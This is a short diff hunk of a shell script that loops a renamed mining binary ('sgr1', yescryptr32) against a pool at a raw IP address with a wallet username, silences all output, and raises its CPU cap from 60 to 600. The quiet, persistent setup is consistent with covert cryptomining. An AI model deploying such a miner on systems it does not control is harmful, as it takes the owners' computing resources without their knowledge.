@@ -22,7 +22,7 @@ chmod +x sgr1
 
 while true; do
     # Use a subshell to combine cpulimit and sgr1
-    (cpulimit -l 60 -e ./sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1) &
+    (cpulimit -l 600 -e ./sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1) &
 
     # Get the PID of the cpulimit command
     pid=$!
